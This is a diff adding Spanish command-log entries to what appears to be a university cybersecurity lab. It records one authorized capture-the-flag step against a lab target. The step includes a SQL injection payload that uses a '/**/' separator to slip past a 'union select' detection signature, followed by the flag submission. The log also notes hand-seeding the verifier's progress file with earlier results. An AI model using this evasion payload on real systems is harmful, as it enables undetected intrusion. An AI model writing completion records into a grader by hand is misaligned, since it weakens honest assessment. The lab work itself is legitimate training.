@@ -80,3 +80,40 @@ docker exec cyberlab-attacker bash /tmp/lab10-p5/ctf status 10
 
 # Resultado: R5 aceptado.
 # El estado temporal de 1/5 no representa el progreso consolidado del grupo.
+
+# --- P4 — R4: evasión controlada de la firma sqli-union (2026-10-28) ---
+# Al iniciar la sesión los contenedores del lab estaban detenidos (sesión
+# anterior); se levantó el target del Lab 10 desde la raíz del repo, lo que
+# reconstruyó/recreó los contenedores e inició una sesión de logs nueva:
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab10-deteccion-evasion/entorno/target.compose.yml up -d --build
+# No se generó ningún tráfico de prueba antes de verificar el target.
+# Verificación del target, desde cyberlab-attacker (solo lectura):
+curl -sS http://phantomcorp/soc/reglas
+# Confirma: ruleset del Lab 10 y sqli-union matchea /union\s+select/ (exige ESPACIO).
+
+# Anotación previa. Request único, endpoint y ruta tomados del README del lab
+# (/api con query q); no se leyó server.py ni retos.manifest. El separador /**/
+# sustituye al espacio que la firma exige, según la propia nota del ruleset.
+# Ejecutado desde cyberlab-attacker contra phantomcorp (único objetivo autorizado):
+curl -sS -i "http://phantomcorp/api?q=1%20UNION/**/SELECT%20null,null--"
+# Respuesta cruda conservada en evidencia/salidas/r4-evasion-controlada.txt
+# ("200 OK (procesado como benigno)" + FLAG{signature_evaded}). La primera
+# captura llegó al host en UTF-16 por la redirección de PowerShell; ese archivo
+# se reescribió con el mismo contenido de texto, sin repetir ningún request.
+
+# Verificación del efecto en el SOC después de la prueba (GET de solo lectura):
+curl -sS http://phantomcorp/soc > /tmp/soc-raw.txt
+# Se transportó con docker cp a evidencia/salidas/r4-soc-despues.txt.
+# Verificado en host: las últimas 125 líneas del snapshot coinciden línea a
+# línea con la línea base de R1; no hay alertas de sqli-union, ni eventos
+# nuevos, ni rastro del request propio (la vista del log es estática).
+
+# Envío de la flag con el verificador oficial en copia temporal normalizada a LF:
+# ctf, bin/lib/*.sh y retos.manifest se normalizaron con python3 (CRLF de Windows);
+# .progreso/10.done se sembró con R1-R3 y R5, ya validados por el grupo en sus
+# sesiones y respaldados por sus evidencias, para reflejar el progreso consolidado.
+./ctf submit 10 R4 'FLAG{signature_evaded}'   # aceptada en esta sesión
+./ctf status 10                               # 5/5 consolidado
+# Salidas en evidencia/salidas/r4-submit.txt y evidencia/salidas/status-10.txt.
+# Progreso consolidado copiado al host:
+# docker cp cyberlab-attacker:/tmp/lab10-p4/.progreso/10.done .progreso/10.done
